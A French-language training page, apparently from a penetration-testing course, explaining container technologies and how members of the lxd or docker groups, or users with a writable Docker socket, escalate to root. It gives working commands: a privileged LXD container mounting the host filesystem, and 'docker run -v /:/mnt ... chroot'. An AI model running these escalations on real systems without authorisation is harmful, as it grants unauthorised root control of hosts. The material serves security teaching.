  Conteneurs
==========

* * * * *

Les conteneurs fonctionnent au niveau du système d'exploitation et les machines virtuelles au niveau du matériel. Les conteneurs partagent ainsi un système d'exploitation et isolent les processus applicatifs du reste du système, tandis que la virtualisation classique permet à plusieurs systèmes d'exploitation de fonctionner simultanément sur un seul système.

L'isolation et la virtualisation sont essentielles car elles permettent de gérer au mieux les ressources et les aspects de sécurité. Par exemple, ils facilitent la surveillance pour trouver des erreurs dans le système qui n'ont souvent rien à voir avec les applications nouvellement développées. Un autre exemple serait l'isolement des processus qui nécessitent généralement des privilèges root. Une telle application peut être une application Web ou une API qui doit être isolée du système hôte pour empêcher l'escalade vers les bases de données.

* * * * *

Conteneurs Linux
----------------

Linux Containers ( `LXC`) est une technique de virtualisation au niveau du système d'exploitation qui permet à plusieurs systèmes Linux de s'exécuter indépendamment les uns des autres sur un seul hôte en possédant leurs propres processus mais en partageant le noyau du système hôte pour eux. LXC est très populaire en raison de sa facilité d'utilisation et est devenu un élément essentiel de la sécurité informatique.

Par défaut, `LXC`consommez moins de ressources qu'une machine virtuelle et disposez d'une interface standard, ce qui facilite la gestion simultanée de plusieurs conteneurs. Une plate-forme `LXC`peut même être organisée sur plusieurs clouds, offrant une portabilité et garantissant que les applications s'exécutant correctement sur le système du développeur fonctionneront sur n'importe quel autre système. De plus, les applications volumineuses peuvent être démarrées, arrêtées ou leurs variables d'environnement modifiées via l'interface de conteneur Linux.

La facilité d'utilisation de `LXC`est leur avantage le plus significatif par rapport aux techniques classiques de virtualisation. Cependant, l'énorme diffusion de `LXC`, un écosystème presque global, et des outils innovants est principalement due à la plate-forme Docker, qui a mis en place des conteneurs Linux. L'ensemble de la configuration, depuis la création de modèles de conteneur et leur déploiement, la configuration du système d'exploitation et de la mise en réseau jusqu'au déploiement d'applications, reste le même.

#### Démon Linux

Linux Daemon ( [LXD](https://github.com/lxc/lxd) ) est similaire à certains égards mais est conçu pour contenir un système d'exploitation complet. Il ne s'agit donc pas d'un conteneur d'application mais d'un conteneur système. Avant de pouvoir utiliser ce service pour élever nos privilèges, nous devons appartenir au groupe `lxc`ou `lxd`. Nous pouvons le savoir avec la commande suivante :

  Démon Linux

```
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)

```

À partir de maintenant, il existe maintenant plusieurs façons d'exploiter `LXC`/ `LXD`. Nous pouvons soit créer notre propre conteneur et le transférer vers le système cible, soit utiliser un conteneur existant. Malheureusement, les administrateurs utilisent souvent des modèles peu ou pas sécurisés. Cette attitude a pour conséquence que nous avons déjà des outils que nous pouvons utiliser nous-mêmes contre le système.

  Démon Linux

```
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz

```

Ces modèles n'ont souvent pas de mot de passe, surtout s'il s'agit d'environnements de test simples. Ceux-ci doivent être rapidement accessibles et simples à utiliser. L'accent mis sur la sécurité compliquerait toute l'initiation, la rendrait plus difficile et donc la ralentirait considérablement. Si nous avons un peu de chance et qu'il y a un tel conteneur sur le système, il peut être exploité. Pour cela, nous devons importer ce conteneur en tant qu'image.

  Démon Linux

```
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+

```

Après avoir vérifié que cette image a été importée avec succès, nous pouvons lancer l'image et la configurer en spécifiant l' `security.privileged`indicateur et le chemin racine du conteneur. Cet indicateur désactive toutes les fonctionnalités d'isolation qui nous permettent d'agir sur l'hôte.

  Démon Linux

```
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true --alias=ubuntutemp
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

```

Une fois que nous avons fait cela, nous pouvons démarrer le conteneur et nous y connecter. Dans le conteneur, nous pouvons ensuite accéder au chemin que nous avons spécifié pour accéder au `resource`système hôte en tant que `root`.

  Démon Linux

```
container-user@nix02:~$ lxc init privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var

```

* * * * *

Docker
------

Docker est un outil open source populaire qui fournit un environnement d'exécution portable et cohérent pour les applications logicielles. Docker utilise des conteneurs comme environnements isolés dans l'espace utilisateur qui s'exécutent au niveau du système d'exploitation et partagent le système de fichiers et les ressources système. Un avantage est que la conteneurisation consomme donc nettement moins de ressources qu'un serveur traditionnel ou une machine virtuelle. La principale caractéristique de Docker est que les applications sont encapsulées dans ce que l'on appelle des conteneurs Docker. Ils peuvent donc être utilisés pour n'importe quel système d'exploitation. Un conteneur Docker représente un package logiciel exécutable autonome léger qui contient tout le nécessaire pour exécuter un runtime de code d'application.

Docker fournit également une boîte à outils couramment utilisée pour empaqueter des applications dans des images de conteneur immuables. Cela se fait en écrivant `Dockerfile`et en exécutant les commandes appropriées pour créer l'image à l'aide du serveur Docker.

Pour obtenir les privilèges root via Docker, l'utilisateur avec lequel nous sommes connectés doit faire partie du `docker`groupe. Cela lui permet d'utiliser et de contrôler le démon Docker.

#### Docker Linux

  Docker Linux

```
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)

```

Alternativement, Docker peut avoir SUID défini, ou nous sommes dans le fichier Sudoers, ce qui nous permet de fonctionner `docker`en tant que root. Les trois options nous permettent de travailler avec Docker pour augmenter nos privilèges.

La plupart des hébergeurs disposent d'une connexion Internet directe car les images de base et les conteneurs doivent être téléchargés. Cependant, pour des raisons de sécurité, de nombreux hébergeurs peuvent être déconnectés d'internet la nuit et en dehors des heures de travail. Cependant, si ces hôtes sont situés dans un réseau où, par exemple, un serveur Web doit passer, il reste joignable.

Pour voir quelles images existent et auxquelles nous pouvons accéder, nous pouvons utiliser la commande suivante :

  Docker Linux

```
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB

```

  Docker Linux

```
docker-user@nix02:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
root@nix02:~# ls -l /mnt

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var

```

#### Prise Docker

Un cas qui peut également se produire est lorsque le socket Docker est accessible en écriture. Habituellement, cette prise est située dans `/var/run/docker.sock`. Cependant, l'emplacement peut naturellement être différent. Parce que fondamentalement, cela ne peut être écrit que par un groupe root ou docker. Si nous agissons en tant qu'utilisateur ne faisant pas partie de l'un de ces deux groupes et que le socket Docker a toujours les privilèges d'être accessible en écriture, nous pouvons toujours utiliser ce cas pour élever nos privilèges.

  Prise Docker

```
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
root@nix02:~# ls -l /mnt

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var

```

#### Kubernetes

Comparé à Docker, Kubernetes est une plate-forme permettant d'exécuter et de gérer des conteneurs à partir de nombreux environnements d'exécution de conteneurs. Kubernetes ( `K8s`) prend en charge de nombreux environnements d'exécution de conteneur, y compris Docker. Kubernetes est à l'origine de Google, l'un des premiers partisans des technologies de conteneur Linux. Cette plate-forme open source automatise le fonctionnement des conteneurs Linux. Des groupes entiers d'hôtes exécutant les conteneurs sont regroupés pour une gestion facile.
